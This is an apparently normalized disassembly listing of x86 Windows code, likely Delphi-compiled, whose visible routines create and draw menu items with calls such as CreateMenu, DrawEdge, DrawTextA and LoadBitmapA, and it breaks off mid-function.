call sub_45adb4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45adc4
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45adc4
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45adc4
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_4583f0
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_459348
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_4590d8
mov eax [ rw-data ]
call sub_4583f0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_459394
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4214fc
push ebx
push sub_459148
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4593d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4595bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45b370
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041fc
test bh 0x4
je r-xdata
mov eax edi
call sub_45c9ac
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404570
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424ac0
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40442c
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_424498
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_4244a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4595c3
lea eax [ ebp - 0xc ]
call sub_404164
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404424
push eax
mov eax [ ebp - 0xc ]
call sub_404624
push eax
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4241d8
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404424
push eax
mov eax [ ebp - 0xc ]
call sub_404624
push eax
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4241d8
mov eax 0xff00000d
call sub_423d18
mov esi eax
mov eax 0xff000010
call sub_423d18
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4241d8
jmp r-xdata
sub_459628
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_459f10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4249a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4241d8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404570
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4249a4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4563ec
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42516c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42499c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4249a4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_459a6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42894c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4241d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4563ec
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4249a4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42499c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429984
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424978
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e94
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4566dc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4249a4
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4593d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4244a4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42516c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424c9c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4241d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403368
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42516c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4593d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f17
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45849c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4593d8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_459f30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45a838
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4249a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4241d8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404570
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4249a4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424d48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
